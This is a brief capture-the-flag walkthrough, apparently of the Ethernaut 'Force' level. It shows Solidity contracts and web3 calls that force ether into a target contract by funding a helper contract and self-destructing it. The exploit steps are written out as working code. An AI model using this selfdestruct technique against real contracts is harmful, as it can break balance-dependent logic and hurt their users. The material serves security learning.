First, try sending a straightforward transaction from another contract:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Force {

  address TARGET = 0x84474EE4342f9F86123C7B54BD84A26329D505F2;

  constructor() {}

  function feed() public payable returns (bool) {
    address payable _address = payable(TARGET);
    return _address.send(msg.value);
  }
}
```

Trigger the transaction:

```js
abi = '[{"inputs":[],"name":"feed","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"payable","type":"function"},{"inputs":[],"stateMutability":"nonpayable","type":"constructor"}]';
agent = new web3.eth.Contract(JSON.parse(abi), '0x02cCC66F8DFc120a460D1Db55125597D0719ffa2');
agent.methods.feed().send({from: player, value: 1}, function(error, data) {console.log(data);});
```

Does not work.
Instead it can be forced by self-destructing the contract and registering the target as heir:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Force {

  address TARGET = 0x84474EE4342f9F86123C7B54BD84A26329D505F2;

  constructor() {}

  function feed() public payable {
    address payable _address = payable(TARGET);
    selfdestruct(_address);
  }
}
```

Fund this new contract and then kill it:

```js
abi = '[{"inputs":[],"name":"feed","outputs":[],"stateMutability":"payable","type":"function"},{"inputs":[],"stateMutability":"nonpayable","type":"constructor"}]';
agent = new web3.eth.Contract(JSON.parse(abi), '0xaB331227BD62618EB38CcB660652ef0f2090578c');
agent.methods.feed().send({from: player, value: 1}, function(error, data) {console.log(data);});
```
